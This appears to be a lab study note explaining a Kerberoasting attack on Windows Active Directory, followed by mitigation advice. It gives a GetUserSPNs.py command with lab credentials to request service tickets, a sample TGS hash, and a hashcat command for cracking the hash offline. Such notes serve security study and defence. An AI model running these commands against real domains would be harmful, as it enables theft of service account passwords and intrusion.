A **Kerberoasting** attack targets service accounts in a Windows Active Directory (AD) environment. These service accounts typically have low-level privileges but may have weak passwords, making them prime targets for attackers.

In Kerberoasting, an attacker requests service tickets for service accounts and then attempts to crack the tickets offline to retrieve the service account's plaintext password.

#### 1. **Getting Service Principal Names (SPNs)**

SPNs are unique identifiers for services in a Kerberos environment. By retrieving these, we can potentially identify accounts associated with services that can be targeted for Kerberos-related attacks. The following command uses `GetUserSPNs.py` to request a Kerberos ticket for a user in the domain:

`GetUserSPNs.py quigley.local/j.smith:Password1 -dc-ip 192.168.163.5 -request`

- `quigley.local/j.smith:Password1`: User credentials.
- `-dc-ip 192.168.163.5`: IP address of the domain controller.
- `-request`: Requests a Kerberos ticket.

**Result:** The output shows a Kerberos ticket for a service (in this case, `SQLService`), along with the associated hash.
#### 2. **Extracting the Kerberos Hash**

The Kerberos hash can be extracted from the output generated by the previous step. The hash format looks like this:
`quigley.local/SQLService*$$krb5tgs$23$*SQLService$QUIGLEY.LOCAL$quigley.local/SQLService*$f451c109d2100f87ae431ec3aa173ee7$eb0fea2d1d13f40e8fdda153b9461acd2360e942fe1e463e6644154b2df5af0705ea28a7399606277cbcc67de4f8713f55b4cab3a37b54d52f153374addefc7ae739240d3d2400550973a6491ac9c35eeddb854dfe7e6b20f5cd19d5f55f584d5c7a3036972990371e7553100fffe64794aa2db6277b537329d7710b378b63c8f3c9c47d4b56f7e63ab7d5a0a88996a6716f33cd37142d304d17ddd3eaf2b85ef6912900cb6d546de81f840a00e8b2925c14613659713dc6a8a471a202c53ecaa8f0a69d64a5652a0661ba6e9213ef3795598518e529c0400b941e82efd75f97b02a9e92ef9a381d86ac9c5c6b29bbedc6011f74d1dcf`

This is the Kerberos Ticket Granting Service (TGS) hash, which can then be cracked using a password-cracking tool.
#### 3. **Cracking the Kerberos Hash Using Hashcat**

The Kerberos hash is stored in a text file (e.g., `krb.txt`). To crack the hash, you use `hashcat` with the correct hash mode (13100 for Kerberos 5 TGS). The following command attempts to crack the hash using the `rockyou.txt` wordlist:

`hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt`

**Result:** If successful, `hashcat` will output the cracked password, revealing sensitive information.

![](../../Images/Pasted%20image%2020250221230529.png)

#### 4. **Mitigation Strategies**

- **Strong Service Account Passwords**: Ensure service accounts have long, complex passwords to prevent easy cracking.
- **Managed Service Accounts (MSAs)**: Use Managed Service Accounts, which automatically manage and rotate service account passwords.
- **Least Privilege**: Minimize the privileges of service accounts. They should only have access to the specific resources they need.
- **SPN Monitoring**: Regularly audit SPNs and service accounts for any suspicious activity.
- **Kerberos Ticket Lifetimes**: Reduce the lifetime of Kerberos tickets to limit the window for cracking.